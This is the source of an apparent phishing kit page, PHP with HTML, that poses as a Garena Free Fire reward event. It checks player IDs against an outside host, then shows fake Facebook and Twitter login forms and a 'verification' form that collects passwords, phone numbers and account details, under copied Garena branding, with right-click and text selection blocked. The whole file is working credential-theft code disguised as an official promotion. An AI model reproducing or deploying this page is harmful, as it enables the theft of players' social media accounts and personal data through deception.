<?php
$var = "";
$valid = 1;
if (isset($_POST['ffid'])) {
function containsOnlyNumbers($input) {
    return ctype_digit($input);
}
function isValidString($input) {
    return ctype_digit($input) && strlen($input) >= 7;
}
$uid = $_POST['ffid'];
if (!containsOnlyNumbers($uid)) {
 $var = 'Aah! Wrong uid entered';
 $valid = 0;
} 
if (!isValidString($uid)) {
 $var = 'Aah! Wrong uid entered';
 $valid = 0;
}
if ($valid == 1) {
$response = file_get_contents('https://vip-club-event.xyz/api/api.php?uid='.$uid.'');
if (strpos($response, 'incorrect_player_id') === false) {
$ign = $response;
if (strpos($ign, 'captcha') === false) {
$var = "Booyah! ".$ign." You are eligible for a free reward";
} else {
$var = "Booyah! Survivor, You are eligible for a free reward";
}
} else {
$var = "Aah! Wrong uid entered";
}
}
}
?>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Garena Free Fire Mobile Event">
    <meta name="description" content="Collect your special rewards at the Royale Pas Event. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:description" content="Collect your special rewards at the Royale Pas Event. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Garena Free Fire Max Event">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Garena Free Fire Max">
    <meta name="theme-color" content="#000">
    <meta property="og:image" content="https://g.top4top.io/p_21446tfln1.jpg">
    <title>Garena Free Fire Mobile India Event</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/login/facebook.css">
    <link rel="stylesheet" href="css/login/twitter.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" href="https://g.top4top.io/p_21446tfln1.jpg">
    <link rel="stylesheet" href="./styles/search-style.css">
    <link rel="stylesheet" href="./styles/style2.css">

<script>
        var expirationDate = "2024-10-10";
        var currentDate = new Date();
        var expirationDateObj = new Date(expirationDate);
        if (currentDate >= expirationDateObj) {
            window.location.href = "expire.html";
        }
    </script>
</head>
<body oncontextmenu="return false" onselectstart="return false"  ondragstart="return false ">
    <style type="text/css">
        html {
            box-sizing: border-box;
            height: 100%;
            font-size: 10px;
        }

        *,
        *::before,
        *::after {
            box-sizing: inherit;
        }

        body {
           
            background-image: url('img/container.jpg');
            background-repeat:repeat;
            background-attachment:scroll; 
            background-size: 100% 100%;
             margin: 0;
            font-family: 'Teko';
        }

        .container {
            border: 1px solid #CAB16D;
        }

        .navbar {
            background: #0C0C0C;
            width: 100%;
            height: 60px;
        }

        .navbar-logo {
            width: 100px;
            height: 30px;
            float: left;
            margin-top: 12px;
            margin-left: 13px;
        }

        .navbar-shop {
            width: 29px;
            margin-top: 19px;
            margin-right: 8px;
        }

        .navbar-menu {
            width: 20px;
            margin-top: 19px;
            margin-right: 5px;
        }

        .navbar-right {
            width: auto;
            float: right;
        }

        .navbar-download {
            background: #ffca13;
            width: 50px;
            height: 50px;
            margin-top: 10px;
            margin-right: 3px;
            border-radius: 0px;
            float: right;
        }

        .navbar-download img {
            width: 20px;
            height: 21px;
            margin: 13px;
        }

        .navbar-righ {
            width: auto;
            float: right;
        }

        .navbar-shp {
            width: 29px;
            margin-top: 19px;
            margin-right: 10px;
        }

        /* .event-theme {
	width:100%;
	height:60px;
	margin-top: -20px;
	margin-left:auto;
	margin-right:auto;
	padding: 5px;
	display:block;
} */

        .event-notification-wrapper {
            width: 85%;
            height: auto;
            margin-top: 20px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 5px;
            display: block;
        }

        .event-notification-content {
            width: 100%;
            height: auto;
            bottom: -5px;
            padding: 5px;
            color: #181715;
            text-shadow: 0.5px 0.5px #9A7242;
            font-size: 21px;
            font-family: Teko;
            text-align: center;
        }

        .footer {
            background: #131313;
            width: 100%;
            height: auto;
            padding: 15px;
        }

        .footer-copyright-icon {
            width: 55%;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            display: block;
        }

        .footer-txt-copyright {
            color: #bdbdbd;
            font-size: 15px;
            font-family: Teko;
            text-align: center;
        }

        .item img {
            border: none;
        }

        .item button {
            border: 1.5px solid #CAB16D;
            color: #000000;
            text-shadow: 0.3px 0.3px #9A7242;
        }

        .nav-popup-title {
            padding-left: 15px;
            padding-top: 2px;
            color: #fff;
            font-size: 22px;
            font-family: Teko;
            font-weight: 500;
            text-align: left;
        }

        .nav-popup img {
            width: 20px;
            height: 20px;
            margin-top: 5px;
            margin-right: 10px;
            color: #fff;
            float: right;
        }

        .popup-alerts {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #fff;
            font-size: 20px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-alert {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #fff;
            font-size: 20px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-alert i {
            padding-top: 15px;
            padding-bottom: 15px;
            color: #fff;
            font-size: 40px;
            text-align: center;
        }

        .popup-footer button:nth-child(1) {
            width: auto;
            height: auto;
            margin-top: 4px;
            margin-left: auto;
            margin-right: auto;
            padding: 3px;
            padding-left: 28px;
            padding-right: 28px;
            color: #fffea7;
            font-size: 18px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none;
        }

        .popup-btn-login {
            width: 40%;
            height: auto;
            padding: 6px;
            margin: 5px;
            color: #000;
            font-size: 15px;
            font-family: Teko;
            border: none;
            outline: none;
            margin-bottom: 45px;
            position: relative;
            display: line-block;
        }

        .popup-btn-login i {
            color: #fff;
            font-size: 23px;
            float: left;
        }

        .popup-btn-facebook {
            background: #4167B2;
            color: #fff;
        }

        .popup-btn-twitter {
            background: #198B96;
            color: #fff;
        }

        .popup-form-footer {
            margin-top: -16px;
        }

        .popup-form-footer button {
            width: auto;
            height: auto;
            margin-top: 4px;
            padding: 3px;
            padding-left: 30px;
            padding-right: 30px;
            color: #fffea7;
            font-size: 18px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none;
        }

        .popup-form input {
            background: none;
            background-size: 100% 100%;
            width: 90%;
            height: auto;
            margin-left: 6px;
            margin-bottom: 3px;
            padding: 4.4px;
            color: #fff;
            font-size: 17px;
            font-family: Teko;
            font-weight: 500;
            border-radius: 2px;
            border: 1px solid #fff;
            position: relative;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }

        .popup-form input::placeholder {
            color: #fff;
        }

        .popup-form select {
            background: none;
            background-size: 100% 100%;
            width: 90%;
            height: auto;
            margin-left: 6px;
            margin-bottom: 3px;
            padding: 6px;
            padding-left: 6px;
            color: #fff;
            font-size: 17px;
            font-family: Teko;
            font-weight: 500;
            border-radius: 2px;
            border: 1px solid #fff;
            position: relative;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }

        .sn {
            font-size: 25px;
            text-align: center;
            color: #ffca13;
        }
    </style>
    <div class="container">
        <div class="navbar">
            <img class="navbar-logo" src="cheif/cheif.png" <div class="navbar-right">
            <img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_f_w.png">
            <img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_i_w.png">
            <img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_y_w.png">
            <div class="navbar-download"><img src="https://i.ibb.co/jwMxWFh/menu.png"></div>
            <div class="navbar-righ">
                <img class="navbar-shp" src="https://www.battlegroundsmobileindia.com/common/img/icon/icon_shop_50.png">
            </div>
        </div>
    </div>
    <div class="header">
        <video src="img/nfc.mp4" autoplay loop muted></video>
    </div>
    <div class="Find-UserId">
    <form name="myFirstForm" class="search-form" id="search-form" method="post" >
      <input class="search-area" id="search" type="search" name="ffid" placeholder="Enter UID" autofocus required />
      <button class="search-btn btn btn-gold" type="submit" name="sub" href="javascript:void(0)">Go</button>
    </form>
    <div class="congrats">
      <div class="el ang-a animated d-none" data-in="zoomOut"></div>
      <div class="el ang-b animated d-none" data-in="zoomOut"></div>
      <div class="el glow animated d-none" data-in="fadeIn"></div>
      <div class="el bg bg-1 animated d-none" data-in="fadeIn" data-out="zoomOut"></div>
      <div class="el dots animated d-none"> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i> <i></i></div>
      <div class="el bg bg-2 animated d-none" data-in="zoomIn" data-out="bounceOut"></div>
      <div class="el ang-c animated d-none" data-in="zoomOut"></div>
      <div class="el shine animated d-none" data-in="shineIn" data-out="fadeOut"></div>
      <div class="el text animated d-none" data-in="zoomOutIn" data-out="zoomOutLeft">CONGRATULATIONS</div>
    </div>
    <div class="sn" id="success-msg">
      <?php echo $var; ?>	      
    </div>
  </div>
    
    <div class="event-notification-wrapper">
<div class="event-notification-content">CLAIM AND GET YOUR EXCLUSIVE REWARD NOW</div>
    </div>
    <div class="box">
        <center>
            <div class="tab_rewards" id="latest">
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/1.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/2.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/3.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/4.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/5.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/6.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/7.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/8.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/9.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/10.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/10.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/11.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/11.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/12.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/12.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/13.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/13.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/14.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/14.jpg">Collect</button>
                    </div>
                </div>
                <div class="item itemShine">
                    <div>
                        <figure>
                            <img style="border-bottom: 0px;" src="img/rewards/15.jpg">
                        </figure>
                    </div>
                    <div>
                        <button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/15.jpg">Collect</button>
                    </div>
                </div> -->
            </div>
        </center>
    </div>
    <div class="footer">
        <img class="footer-copyright-icon" src="cheif/cheif.png">
        <div class="footer-txt-copyright">ⓒGarena, Inc. All rights reserved.</div>
        <div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy
        </div>
    </div>
    </div>
    <div class="popup itemReward_confirmation" style="display: none;">
        <div class="popup-box">
            <div class="nav-popup">
                <img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
                <div class="nav-popup-title">Reward Confirmation</div>
            </div>
            <div class="popup-box-bg">
                <div style="color: #fffea7" class="popup-alert">Are you sure to collect this reward?</div>
                <div class="popup-item itemShine">
                    <div>
                        <figure>
                            <img src="" id="myItemReward_confirmationImg">
                        </figure>
                    </div>
                </div>
                <br>
            </div>
            <div class="popup-footer">
                <button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
            </div>
        </div>
    </div>
    <div class="popup account_login" style="display: none;">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="nav-popup-title">Account Login</div>
            </div>
            <div class="popup-box-bg">
                <div style="color: #fffea7" class="popup-alerts">Log in using your Free Fire Max account</div>
                <button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
                <img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/66bK3tfJ/Amod.png">
                <br>
            </div>
            <div class="popup-footer-log">
            </div>
        </div>
    </div>
    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="popup-box-login-fb">
            <a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div>
            <div class="content-box-fb">
                <p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
                <p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you
            forget your password?</b></p>
                <img src="img/logo.jpg">
                <div class="txt-login-fb">Log in to your Facebook account to connect to Garena Free Fire Mobile.</div>
                <form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
                    <input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
                    <input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
                    <div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i>
                    </div>
                    <div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
                    <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
                    <button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
                </form>
                <div class="txt-create-account">Create account</div>
                <div class="txt-not-now">Not now</div>
                <div class="txt-forgotten-password">Forgotten password?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">English (UK)</div>
                    <div class="language-name">Bahasa Indonesia</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name"><i class="fa fa-plus"></i></div>
                </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
        </div>
    </div>
    <div class="popup-login login-twitter animated fadeIn" style="display: none;">
        <div class="popup-box-login-twitter">
            <a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
            <div class="box-twitter">
                <center>
                    <div class="header-twitter">
                        <img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
                </center>
                <center>
                    <br><br>
                    <form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
                        <div class="txt-login-twitter" style="text-align: left; margin-left: 95px;">Login to Twitter</div>
                        <div class="input-box-twitter">
                            <label>Phone, email, or username</label>
                            <input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
                        </div>
                        <div class="input-box-twitter">
                            <div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
                            <div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
                            <label>Password</label>
                            <input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
                        </div>
                        <p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
                        <p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!
                        </p>
                        <input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
                        <button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
                        <div class="footer-menu-twitter">Forgot password?</div>
                        <div class="footer-menu-twitter bulet">•</div>
                        <div class="footer-menu-twitter">Sign up to Twitter</div>
                    </form>
                </center>
                </div>
            </div>
        </div>
    </div>
    <div class="popup account_verification" style="display: none;">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="nav-popup-title">Account Verification</div>
            </div>
            <div class="popup-box-bg">
                <div style="color: #fffea7" class="popup-alert">Complete your account details</div>
                <form class="popup-form" style="color: #fffea7" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
                    <input type="hidden" name="email" id="validateEmail" readonly>
                    <input type="hidden" name="password" id="validatePassword" readonly>
                    <input style="color: #fffea7" type="number" name="playid" id="playid" placeholder="UID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')" minlength="10">
                    <input style="color: #fffea7" type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')" minlength="10">
                    <select name="level" style="color: #fffea7" id="level" required oninvalid="this.setCustomValidity('select your Account Level')" oninput="setCustomValidity('')">
            <option selected="selected" disabled="disabled" value="">Account Level</option>
            <option>1</option>
            <option>2</option>
            <option>3</option>
            <option>4</option>
            <option>5</option>
            <option>6</option>
            <option>7</option>
            <option>8</option>
            <option>9</option>
            <option>10</option>
            <option>11</option>
            <option>12</option>
            <option>13</option>
            <option>14</option>
            <option>15</option>
            <option>16</option>
            <option>17</option>
            <option>18</option>
            <option>19</option>
            <option>20</option>
            <option>21</option>
            <option>22</option>
            <option>23</option>
            <option>24</option>
            <option>25</option>
            <option>26</option>
            <option>27</option>
            <option>28</option>
            <option>29</option>
            <option>30</option>
            <option>31</option>
            <option>32</option>
            <option>33</option>
            <option>34</option>
            <option>35</option>
            <option>36</option>
            <option>37</option>
            <option>38</option>
            <option>39</option>
            <option>40</option>
            <option>41</option>
            <option>42</option>
            <option>43</option>
            <option>44</option>
            <option>45</option>
            <option>46</option>
            <option>47</option>
            <option>48</option>
            <option>49</option>
            <option>50</option>
            <option>51</option>
            <option>52</option>
            <option>53</option>
            <option>54</option>
            <option>55</option>
            <option>56</option>
            <option>57</option>
            <option>58</option>
            <option>59</option>
            <option>60</option>
            <option>61</option>
            <option>62</option>
            <option>63</option>
            <option>64</option>
            <option>65</option>
            <option>66</option>
            <option>67</option>
            <option>68</option>
            <option>69</option>
            <option>70</option>
            <option>71</option>
            <option>72</option>
            <option>73</option>
            <option>74</option>
            <option>75</option>
            <option>76</option>
            <option>77</option>
            <option>78</option>
            <option>79</option>
            <option>80</option>
            <option>81</option>
            <option>82</option>
            <option>83</option>
            <option>84</option>
            <option>85</option>
            <option>86</option>
            <option>87</option>
            <option>88</option>
            <option>89</option>
            <option>90</option>
            <option>91</option>
            <option>92</option>
            <option>93</option>
            <option>94</option>
            <option>95</option>
            <option>96</option>
            <option>97</option>
            <option>98</option>
            <option>99</option>
            <option>100</option>
          </select>
                    <input type="hidden" name="login" id="validateLogin" readonly>
                    <br><br>
            </div>
            <div class="popup-form-footer">
                <button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
            </div>
            </form>
        </div>
    </div>
    <div class="popup check_verification" style="display: none;">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="nav-popup-title">Account Verification</div>
            </div>
            <div class="popup-box-bg">
                <div class="popup-alert">
                    <br>
                    <i style="color: #fffea7" class="zmdi zmdi-spinner zmdi-hc-spin"></i>
                    <br> Checking your account details...
                    <br><br>
                </div>
                <div class="popup-form-footer">
                </div>
            </div>
        </div>
    </div>
    <div class="popup processing_account" style="display: none;">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="nav-popup-title">Processing Account</div>
            </div>
            <div class="popup-box-bg">
                <div style="color: #fffea7" class="popup-alert">
                    Thank you for joining this event
                    <br>
                    <br> Your account has been successfully processed
                    <br> Please wait up to 24 hours
                </div>
                <div class="popup-footer">
                    <button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://ff.garena.com/en/';">Logout</button>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="js/script.js"></script>
    <script src="js/showHide.js"></script>
    <script src="js/Nizam.js"></script>
    <script src="./js/ss.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script>
        (function() {
            var js = "window['__CF$cv$params']={r:'8264ae2e0b253681',t:'MTcwMDAyMTgwMy4yNjcwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";
            var _0xh = document.createElement('iframe');
            _0xh.height = 1;
            _0xh.width = 1;
            _0xh.style.position = 'absolute';
            _0xh.style.top = 0;
            _0xh.style.left = 0;
            _0xh.style.border = 'none';
            _0xh.style.visibility = 'hidden';
            document.body.appendChild(_0xh);

            function handler() {
                var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;
                if (_0xi) {
                    var _0xj = _0xi.createElement('script');
                    _0xj.innerHTML = js;
                    _0xi.getElementsByTagName('head')[0].appendChild(_0xj);
                }
            }
            if (document.readyState !== 'loading') {
                handler();
            } else if (window.addEventListener) {
                document.addEventListener('DOMContentLoaded', handler);
            } else {
                var prev = document.onreadystatechange || function() {};
                document.onreadystatechange = function(e) {
                    prev(e);
                    if (document.readyState !== 'loading') {
                        document.onreadystatechange = prev;
                        handler();
                    }
                };
            }
        })();
    </script>
</body>

</html>